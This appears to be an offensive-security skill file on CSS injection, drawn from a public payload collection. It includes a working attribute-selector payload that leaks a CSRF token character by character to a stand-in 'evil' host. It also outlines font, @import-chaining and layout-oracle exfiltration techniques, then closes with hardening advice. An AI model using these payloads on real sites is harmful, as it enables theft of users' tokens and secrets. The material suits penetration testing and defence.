---
name: css-injection
description: Exfiltrate data through CSS injection using attribute selectors, font-face, and background-url callbacks when JavaScript execution is blocked
domain: cybersecurity
subdomain: web-application-security
tags: [css-injection, data-exfiltration, dangling-markup]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/CSS Injection
---

# CSS Injection

## Overview
Even without JS (strict CSP, sanitized HTML allowing `<style>` or `style=`), CSS alone can leak secrets — CSRF tokens, partial passwords, page text — by triggering network requests conditional on attribute values.

## When to Use
HTML injection sinks where script execution is filtered but CSS or `style` attributes pass through; rich-text fields; email clients; CSP `script-src 'none'` apps.

## Exfil Techniques

### Attribute-value brute force (one char at a time)
```css
input[name="csrf"][value^="a"] { background: url(//evil/?a); }
input[name="csrf"][value^="b"] { background: url(//evil/?b); }
/* repeat for every char */
```
After the first char is known, chain to two-char selectors. Speed-up: load each batch from an attacker-controlled stylesheet.

### Font-based exfil (Wickopolski / sequential CSS)
Use `@font-face` with `unicode-range` to detect which characters render on the page.

### Sequential exfil with @import chaining
The attacker server holds open the connection and serves the next stylesheet based on the leaked prefix — extracts the whole token in one page load.

### Layout-based oracles
`:has()` / sibling selectors plus `background-image` URLs to detect DOM structure (logged-in state, presence of admin panel).

## Tools
- **CSS-Exfil-Calculator**, **css-exfiltration server** demos.
- Burp Collaborator for capturing the callbacks.

## Hardening
- Strip `<style>` and `style=` from user input.
- CSP `style-src 'self'` (won't fully stop inline if reflected, but blocks remote @import).
- Block external resource loads from CSP `connect-src`, `font-src`, `img-src`.
- Don't render secret tokens inside HTML attributes; use HTTP-only headers.

## References
- `payloadsallthethings/CSS Injection/README.md`
- d0nut: "Stealing data with CSS"; Pepe Vila's CSS exfil research.
